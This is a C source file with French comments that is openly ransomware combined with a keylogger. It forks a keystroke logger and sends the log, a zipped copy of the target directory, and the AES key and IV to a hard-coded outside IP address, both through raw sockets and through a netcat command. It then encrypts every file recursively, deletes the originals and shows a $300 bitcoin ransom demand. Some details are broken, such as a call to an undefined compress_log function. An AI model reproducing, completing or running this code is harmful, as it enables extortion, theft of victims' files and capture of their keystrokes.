#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/err.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/wait.h>

// Inclure la bibliothèque appropriée en fonction du système d'exploitation
#ifdef _WIN32
#include <windows.h> // Nécessaire pour GetAsyncKeyState sur Windows
#else
#include <ncurses.h> // Nécessaire pour ncurses sur UNIX/Linux
#endif


#define SERVER_IP "3.85.229.199"
#define SERVER_PORT 12345
#define BUFFER_SIZE 1024

// Affiche les erreurs OpenSSL et termine le programme.
void handleErrors(void) {
    ERR_print_errors_fp(stderr);
    abort();
}

void exfiltrate_file(const char *file_path) {
    int sockfd;
    struct sockaddr_in server_addr;
    FILE *file;
    char buffer[BUFFER_SIZE];

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("Erreur lors de la création du socket");
        return;
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    server_addr.sin_addr.s_addr = inet_addr(SERVER_IP);

    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Erreur lors de la connexion au serveur");
        close(sockfd);
        return;
    }

    file = fopen(file_path, "rb");
    if (!file) {
        perror("Erreur lors de l'ouverture du fichier");
        close(sockfd);
        return;
    }

    while (!feof(file)) {
        size_t bytes_read = fread(buffer, 1, BUFFER_SIZE, file);
        if (bytes_read > 0) {
            send(sockfd, buffer, bytes_read, 0);
        }
    }

    fclose(file);
    close(sockfd);

    printf("Fichier exfiltré: %s\n", file_path);
}
 
void keylogger(void) {
    FILE *logfile = fopen("log.txt", "w");
    if (logfile == NULL) {
        #ifdef _WIN32
        MessageBox(NULL, "Erreur lors de l'ouverture du fichier de log.", "Erreur", MB_OK);
        #else
        printf("Erreur lors de l'ouverture du fichier de log.\n");
        #endif
        exit(1);
    }

#ifdef _WIN32
    // Code spécifique à Windows
    printf("Press ESC pour sortir.\n");
    while (1) {
        Sleep(10); // Petite pause pour réduire la charge CPU
        for (int key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) == -32767) { // Si la touche est pressée
                if(key == VK_ESCAPE) {
                    fclose(logfile);
                    char log_zip_path[] = "log.zip"; // Nom du fichier zip
                    compress_log(log_zip_path); // Compresser le fichier de log
                    exfiltrate_file(log_zip_path); // Exfiltrer le fichier compressé
                    exit(0); // Quitter le programme proprement
                }
                // Écrire la touche dans le fichier de log
                fputc(key, logfile);
                fflush(logfile);
            }
        }
    }
#else
// Code spécifique à UNIX/Linux
initscr(); // Initialiser ncurses
cbreak(); // Lire le caractère directement sans buffer
noecho(); // Ne pas afficher le caractère à l'écran

int key;
while (1) {
    key = getch(); // Lire un caractère depuis le clavier
    if (key == 27) { // 27 est le code ASCII pour ESC
        fclose(logfile); // Fermer le fichier de log avant la compression et l'exfiltration

        break; // Sortir de la boucle après l'exfiltration
    }
    fputc(key, logfile); // Écrire la touche dans le fichier de log
    fflush(logfile); // Assurer que chaque caractère est immédiatement écrit dans le fichier
}

endwin(); // Fermer ncurses proprement
printf("Les frappes ont été enregistrées dans log.txt et exfiltrées.\n");
exit(0); // terminer le processus enfant proprement
#endif

}

void compress_keys(const char *output_zip_path) {
    char command[256];
    snprintf(command, sizeof(command), "zip %s key.bin iv.bin", output_zip_path);
    if (system(command) != 0) {
        fprintf(stderr, "Échec de la compression des clés\n");
        exit(EXIT_FAILURE);
    }
}


void compress_directory(const char *dir_path, const char *output_zip_path) {
    char command[256];
    snprintf(command, sizeof(command), "zip -r %s %s", output_zip_path, dir_path);
    if (system(command) != 0) {
        fprintf(stderr, "Échec de la compression du répertoire\n");
        exit(EXIT_FAILURE);
    }
}

int encrypt_file(const char *input_path, const unsigned char *key, const unsigned char *iv) {
    FILE *f_in, *f_out;
    int in_len, out_len;
    unsigned char inbuf[BUFFER_SIZE], outbuf[BUFFER_SIZE + EVP_MAX_BLOCK_LENGTH];
    EVP_CIPHER_CTX *ctx;

    if(!(f_in = fopen(input_path, "rb"))) {
        perror("Erreur lors de l'ouverture du fichier source");
        return 0;
    }

    char output_path[256];
    snprintf(output_path, sizeof(output_path), "%s.enc", input_path);
    if(!(f_out = fopen(output_path, "wb"))) {
        perror("Erreur lors de l'ouverture du fichier de sortie");
        fclose(f_in);
        return 0;
    }

    ctx = EVP_CIPHER_CTX_new();
    if(1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv)) {
        EVP_CIPHER_CTX_free(ctx);
        fclose(f_in);
        fclose(f_out);
        return 0;
    }

    while((in_len = fread(inbuf, 1, BUFFER_SIZE, f_in)) > 0) {
        if(1 != EVP_EncryptUpdate(ctx, outbuf, &out_len, inbuf, in_len)) {
            EVP_CIPHER_CTX_free(ctx);
            fclose(f_in);
            fclose(f_out);
            return 0;
        }
        fwrite(outbuf, 1, out_len, f_out);
    }

    if(1 != EVP_EncryptFinal_ex(ctx, outbuf, &out_len)) {
        EVP_CIPHER_CTX_free(ctx);
        fclose(f_in);
        fclose(f_out);
        return 0;
    }
    fwrite(outbuf, 1, out_len, f_out);

    EVP_CIPHER_CTX_free(ctx);
    fclose(f_in);
    fclose(f_out);

    //  Supprimer le fichier original après le chiffrement
    remove(input_path);

    return 1;
}

void encrypt_directory(const char *dir_path, const unsigned char *key, const unsigned char *iv) {
    DIR *dir;
    struct dirent *entry;
    char path[1024];

    if (!(dir = opendir(dir_path))) {
        perror("Échec de l'ouverture du répertoire");
        return;
    }

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;

        snprintf(path, sizeof(path), "%s/%s", dir_path, entry->d_name);

        struct stat path_stat;
        stat(path, &path_stat);

        if (S_ISDIR(path_stat.st_mode)) {
            encrypt_directory(path, key, iv); // Traite récursivement les sous-dossiers
        } else {
            printf("Chiffrement de : %s\n", path);
            encrypt_file(path, key, iv);
        }
    }
    closedir(dir);
}

// Ajout de la fonction showAlert
void showAlert(const char *message) {
    #ifdef _WIN32
    MessageBoxA(0, message, "Ransomware Alert!", MB_ICONERROR | MB_OK);
    #else
    // Commande pour afficher une boîte de dialogue d'erreur sur les systèmes Unix/Linux qui ont Zenity installé
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "zenity --error --title='Ransomware Alert!' --text=\"%s\"", message);
    system(cmd);
    #endif
}

int main(int argc, char *argv[]) {
    pid_t pid = fork();

    if (pid == 0) {
        // Processus enfant exécute le keylogger
        keylogger();
        exit(0); // Termine le processus enfant une fois le keylogger terminé
    } else if (pid > 0) {
        // Processus parent continue avec le programme original
        wait(NULL); // Attend la fin du processus enfant (keylogger) avant de continuer

        if (argc != 2) {
            fprintf(stderr, "Usage: %s <chemin_du_répertoire>\n", argv[0]);
            return 1;
        }
        // Génération aléatoire de la clé et de l'IV pour le chiffrement AES-256-CBC
        unsigned char key[EVP_MAX_KEY_LENGTH], iv[EVP_MAX_IV_LENGTH];
        if (!RAND_bytes(key, sizeof(key)) || !RAND_bytes(iv, sizeof(iv))) {
            fprintf(stderr, "Échec de la génération de la clé et de l'IV\n");
            return 1;
        }

        // Exfiltration de log.txt en utilisant nc
        char exfiltrate_command[256];
        snprintf(exfiltrate_command, sizeof(exfiltrate_command), "nc %s %d < log.txt", SERVER_IP, SERVER_PORT);
        printf("Exécuter la commande: %s\n", exfiltrate_command);
        system(exfiltrate_command);

        // Compression et Exfiltration du répertoire ciblié
        char dir_zip_path[256];
        snprintf(dir_zip_path, sizeof(dir_zip_path), "%s.zip", argv[1]);
        compress_directory(argv[1], dir_zip_path);
        exfiltrate_file(dir_zip_path);

        // Sauvegarde des clés dans des fichiers
        FILE *key_file = fopen("key.bin", "wb");
        FILE *iv_file = fopen("iv.bin", "wb");
        fwrite(key, 1, EVP_MAX_KEY_LENGTH, key_file);
        fwrite(iv, 1, EVP_MAX_IV_LENGTH, iv_file);
        fclose(key_file);
        fclose(iv_file);

        // Compression et exfiltration des clés
        char keys_zip_path[] = "keys.zip";
        compress_keys(keys_zip_path);
        exfiltrate_file(keys_zip_path);

        // Chiffrement du répertoire
        encrypt_directory(argv[1], key, iv);

        // Nettoyage
        remove("key.bin");
        remove("iv.bin");
        remove("keys.zip");
        remove(dir_zip_path);
        remove("log.txt"); 
        printf("Le processus de chiffrement et d'exfiltration est terminé.\n");

        // Afficher l'alerte juste avant de terminer le programme
        showAlert("Vos fichiers ont été chiffrés. Veuillez envoyer 300$ en BTC à l'adresse suivante : xxxxxxx");
    } else {
        // Échec de fork()
        perror("fork");
        exit(EXIT_FAILURE);
    }

    return 0;
}

